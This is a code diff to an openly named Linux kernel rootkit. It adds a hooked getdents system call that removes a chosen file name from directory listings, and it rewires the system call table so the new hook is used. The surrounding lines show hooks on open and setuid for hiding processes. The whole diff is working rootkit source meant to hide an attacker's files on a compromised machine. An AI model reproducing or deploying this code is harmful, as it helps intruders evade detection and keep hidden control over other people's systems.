@@ -146,6 +146,41 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 	return tmp;
 }
 
+asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
+        unsigned int tmp, n;
+        int t;
+        struct linux_dirent *dirp2, *dirp3;
+
+        tmp = (*orig_getdents)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it
+
+        if(tmp > 0){
+                dirp2 = (struct linux_dirent *) kmalloc(tmp, GFP_KERNEL);
+                copy_from_user(dirp2, dirp, tmp);
+                dirp3 = dirp2;
+                t = tmp;
+                while (t > 0){
+                        n = dirp3->d_reclen;
+                        t -= n;
+                        if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
+                                if (t != 0){
+                                        memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
+                                }
+                                else{
+                                        dirp3->d_off = 1024;
+                                }
+                                tmp -=n;
+                        }
+
+                        if (t != 0){
+                                dirp3 = (struct linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
+                        }
+                }
+                copy_to_user(dirp, dirp2, tmp);
+                kfree(dirp2);
+        }
+        return tmp;
+}
+
 /* Hacked Setuid Syscall */
 
 /* This is used for interfacing with the rootkit to hide processes. */
@@ -177,7 +212,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	orig_open = (void *)xchg(&system_call_table[__NR_open],hacked_open); // Replace open with hacked open
 	orig_getdents64 = (void *)xchg(&system_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
-        orig_getdents = (void *)xchg(&system_call_table[__NR_getdents],hacked_getdents64); // Replace getdents64 with hacked getdents64
+        orig_getdents = (void *)xchg(&system_call_table[__NR_getdents],hacked_getdents); // Replace getdents64 with hacked getdents64
 	#if defined(__NR_setuid32)
 	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid32],hacked_setuid);
 	#else
